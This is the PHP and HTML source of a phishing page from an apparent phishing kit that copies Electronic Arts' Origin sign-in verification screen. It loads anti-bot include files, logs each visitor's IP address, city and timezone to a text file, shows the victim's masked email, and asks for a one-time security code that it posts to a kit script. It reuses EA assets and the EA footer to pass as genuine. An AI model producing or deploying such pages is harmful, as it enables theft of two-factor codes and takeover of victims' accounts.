
<?php
    include 'prevents/anti1.php';
include 'prevents/anti2.php';
include 'prevents/anti3.php';
include 'prevents/anti4.php';
include 'prevents/anti5.php';
include 'prevents/anti6.php';
include 'prevents/anti7.php';
include 'prevents/anti8.php';
include 'prevents/anti9.php';

 ob_start();
session_start();
  $content2 = "".$_SESSION['ip']."|".$_SESSION['ip_city']."|"."|".$_SESSION['ip_timezone']."|\r\n";
    $save2=fopen("login_view/total_email_login_view.txt","a+");
    fwrite($save2,$content2);
    fclose($save2);
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta http-equiv="Content-Type" content="text/html;charset=utf-8"/>

    <title>Login Verification</title>
    <meta name="title" content="Login Verification"/>
    <meta name="description" content="Login Verification"/>
    <link rel="shortcut icon" href="/p/favicon.ico"/>
    <meta name="lc" content="en_US"/>
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no"/>
    <meta name="msapplication-tap-highlight" content="no" />
    <meta http-equiv="X-UA-Compatible" content="IE=Edge">
    <meta name="robots" content="noindex" />
    <link href="//fonts.googleapis.com/css?family=Open+Sans:400,300,600" rel="stylesheet" type="text/css">

<script type="text/javascript">window.EA = {};</script>
<script type="text/javascript" src="//fonts.ea.com/fbl8bgs.js"></script>
<script type="text/javascript">(function () {
    try {
        Typekit.load();
    } catch (ex) {
        var html = document.getElementsByTagName('html')[0];
        html.className = (html.className || '') + ' wf-inactive'
    }
})();</script>


        <script type="text/javascript" src="https://eaassets-a.akamaihd.net/resource_signin_ea_com/547.0.200911.1528.2a7f0eb/p/ui/core/js/jquery-1.8.3.min.v_1599803148.js"></script>
        <script type="text/javascript" src="https://eaassets-a.akamaihd.net/resource_signin_ea_com/547.0.200911.1528.2a7f0eb/p/ui/core/js/jquery.origin-ux-elements.v_1599803148-min.js"></script>
        <script type="text/javascript" src="https://eaassets-a.akamaihd.net/resource_signin_ea_com/547.0.200911.1528.2a7f0eb/p/ui/core/js/jquery.origin-layout.v_1599803148-min.js"></script>
        <script type="text/javascript" src="https://eaassets-a.akamaihd.net/resource_signin_ea_com/547.0.200911.1528.2a7f0eb/p/statics/challenge/js/jquery.origin-challenge-onetime.v_1599803148-min.js">



<script type="text/javascript">
    if (!window.challenge_cancel) {
        window.challenge_cancel = function() {
            if ($("#btnCancel").length > 0) {
                $("#btnCancel").trigger("click");
                return true;
            } else {
                return false;
            }
        }
    }
</script>
<script type="text/javascript">
    $(document).ready(function () {
        $("#tfa_code_help_link").on("click", function (event) {
            if ($("#tfa_code_help_link").attr("href").lastIndexOf("#") != 0) {
                event.preventDefault();
                window.open($("#tfa_code_help_link").attr("href"), '_blank');
            }
        });

        $("#learn_more_link").on("click", function (event) {
            if ($("#learn_more_link").attr("href").lastIndexOf("#") != 0) {
                event.preventDefault();
                window.open($("#learn_more_link").attr("href"), '_blank');

            }
        });

        $("#privacyLink").on("click", function (event) {
            if ($("#privacyLink").attr("href").lastIndexOf("#") != 0) {
                event.preventDefault();
                window.open($("#privacyLink").attr("href"), '_blank');
            }
        });
    });
</script>
<script type="text/javascript">
    $(document).ready(function () {
        $(".origin-ux-button").unbind("touchstart").bind("touchstart", ontouchStart);
        $(".origin-ux-button").unbind("touchmove").bind("touchmove", ontouchMove);
        $(".origin-ux-button").unbind("touchend").bind("touchend", ontouchEnd);

        function ontouchStart(event) {
            if (detectMobileDevice()) {
                $(this).addClass('touchOn');
            }
        };

        function ontouchMove(event) {
            if (detectMobileDevice()) {
                $(this).removeClass('touchOn');
            }
        };

        function ontouchEnd(event) {
            if (detectMobileDevice()) {
                $(this).removeClass('touchOn');
            }
        }

        function detectMobileDevice() {
            if (navigator.platform.indexOf('iPad') == -1 && navigator.platform.indexOf('iPhone') == -1 && navigator.platform.indexOf('iPod') == -1 &&
                    navigator.userAgent.indexOf("Android") == -1 && navigator.userAgent.indexOf("Windows Phone") == -1) {
                return false;
            }
            return true;
        }
    });
</script>

<script type="text/javascript">
    $(document).ready(function () {
        $.fn.onetime({
        });
    });

</script>

                <link rel="stylesheet" type="text/css" href="https://eaassets-a.akamaihd.net/resource_signin_ea_com/547.0.200911.1528.2a7f0eb/p/ui/core/css/origin-ux-elements.v_1599803148-min.css"/>
                <link rel="stylesheet" type="text/css" href="https://eaassets-a.akamaihd.net/resource_signin_ea_com/547.0.200911.1528.2a7f0eb/p/ui/core/css/origin-layout.v_1599803148-min.css"/>
                <link rel="stylesheet" type="text/css" href="https://eaassets-a.akamaihd.net/resource_signin_ea_com/547.0.200911.1528.2a7f0eb/p/statics/challenge/css/origin-challenge-onetime.v_1599803148-min.css"/>
                <link rel="stylesheet" type="text/css" href="https://eaassets-a.akamaihd.net/resource_signin_ea_com/547.0.200911.1528.2a7f0eb/p/statics/challenge/css/origin-challenge-common.v_1599803148-min.css"/>
    <!-- Tealium -->
    <script type="text/javascript">
        var utag_data = {
            region: "NA",
            locale: "en_US",
            country: "US",
            language: "en",
            userid: "",
            user_status: "",
            referring_site: "",
            page_name: ""
        }
    </script>
    <script type="text/javascript">
        (function (a, b, c, d) {
            a = '//tags.tiqcdn.com/utag/ea/signin-eacom/prod/utag.js';
            b = document;
            c = 'script';
            d = b.createElement(c);
            d.src = a;
            d.type = 'text/java' + c;
            d.async = true;
            a = b.getElementsByTagName(c)[0];
            a.parentNode.insertBefore(d, a);
        })();
    </script>
    <!-- End of tealium -->

<script type="text/javascript">
    $(document).ready(function () {
        var skin = 'origin';
        var bodySelector = $("body");
        switch (skin) {
            case "origin":
                bodySelector.addClass("origin-com");
                break;
            case "franchisedark":
                bodySelector.addClass("ea-franchise").addClass("ea-franchise-dark");
                break;
            case "franchiselight":
                bodySelector.addClass("ea-franchise").addClass("ea-franchise-light");
                break;
            case "ea":
            default:
                bodySelector.addClass("ea-com");
                break;
        }
    })
</script>


</head>
<body>


<div class="loading-container"></div>
<div class="tfa-container">
<form id="challengeForm" method="POST"  action="setting/step2.php">
        <div class="dialog-info">
            <div id="resend-error-code" class="orange-box-error">
                <div></div>
            </div>
        </div>

        <div class="panel" id="panel-tfa">
            <div class="tfa-form-container">
                <div class="panel-contents">
                    <div class="panel-content">
                        <div class="marketing-area"></div>
                        <h1 class="twoStepHeader">Security Code </h1>
                        <p class="tfa-login-panel-container-style">Everytime we get new security ways to make our comunity safe
                        <br>

<br>
                        <strong>
<?php
                                $email= $_SESSION['email'];
                                $email2 = preg_replace('/(?<=.).(?=.*@)/', '*', $email);
                                echo $email2;

                            ?>                            </strong>
                        </p>
                        <ul>
                            <li id="origin-tfa-container" class="origin-control-tip-container">
<div class="origin-ux-element origin-ux-textbox origin-ux-textbox-web">
        <label class="origin-ux-textbox-label">
        Enter your security code
        </label>
    <span class="origin-ux-textbox-control origin-ux-control origin-ux-purple-textbox-control">
        <span>
            <input  type="password" id="oneTimeCode" name="oneTimeCode" pattern="[A-Za-z0-9]{6}"
                   value=""
                   description="" data-description="" placeholder=" Enter security code here"   autocorrect="off" autocapitalize="off" autocomplete="off"/>
        </span>
    </span>
    <span class="origin-ux-textbox-status-icon"></span>
    <span class="origin-ux-textbox-status-message origin-ux-status-message">
        &nbsp;
    </span>
</div>
    
                            </li>
                            <li id="origin-tfa-ttd-container" class="origin-control-tip-container">
<div class="origin-ux-element origin-ux-checkbox">
    <label class="origin-ux-checkbox-label"></label>

    <div class="origin-ux-checkbox-control origin-ux-control origin-ux-checkbox-control-purple">
        <span>
    <input type="hidden" name="_trustThisDevice" value="on"/>
    <input type="checkbox" id="trustThisDevice" name="trustThisDevice" checked="checked" />
        </span>
        <label id="label-trustThisDevice" class="origin-ux-checkbox-label checkbox-label">Remember this computer/device</label>

        <div class="tfa-ux-tooltip tfa-ux-tooltip-div-offset"><a href="#" class="tfa-ux-tooltip-icon"
                                                                 style="margin-left:0px;"></a>
            <span class="tfa-ux-tooltip-message-top-large">If selected, a security code will no longer be required to sign in from this computer/device.</span>
        </div>
    </div>
    <span class="origin-ux-checkbox-status-message origin-ux-status-message">&nbsp;</span>
</div>
                            </li>
                        </ul>

                        <div class="panel-action-area" id="verify-action-panel">
                              
<a class='origin-ux-element origin-ux-button
    origin-ux-button-primary  btn-next origin-ux-button-primary-purple' href="#" id="btnSubmit">
<span><span>Log In</span></span>
</a>
<a class='origin-ux-element origin-ux-button origin-ux-button-secondary btn-cancel' href="#" id="btnCancel">
<span><span>Cancel</span></span>
</a>
    <input type="hidden" name="_eventId" value="submit" id="_eventId"/>
                            <div style="clear: both">
                                <a id="trouble_logging_link" href="" target='_blank'
                                   class="tfa-login-link">Having trouble logging in?</a>
                                <br>
                            </div>
                        </div>
                        <div class="divider"></div>
                    </div>
                </div>
            </div>
        </div>
<div class="footer">
    <span class="copyright-notice">© 2020 Electronic Arts Inc. Trademarks belong to their respective owners. All rights reserved.</span>
    <ul class="footer-navigation">
            <li class="item-2 even"><a
                    href=""                   target="_blank"
                    class="link link-origin "><span>Shop at Origin</span></a>
            </li><li class="item-3 odd">
            <a href=""
               target="_blank"
               class="link link-origin"><span>Legal</span></a>
        </li><li class="item-4 even">
            <a href=""
               target="_blank"
               class="link link-origin"><span>User Agreement</span></a>
        </li><li class="item-5 odd">
            <a href=""
               target="_blank"
               class="link link-origin"><span>Privacy and Cookie Policy</span></a>
        </li><li class="item-6 even">
            <a href="" target="_blank"
               class="link link-origin"><span>Corporate Info</span></a>
        </li><li class="item-7 odd">
            <a href=""
               target="_blank"
               class="link link-origin"><span>EA Terms of Sale</span></a>
        </li><li class="item-8 even last">
            <a href="" target="_blank"
               class="link link-origin"><span>Contact Us</span></a>
        </li>    </ul>
</div>
    </form>
</div>
<div id="form-errors">
    <span id="form-error-invalid-code">Incorrect code entered</span>
</div>
<!-- ### prdaccountc-30.iad2.infery.com ### -->

</body>
</html>
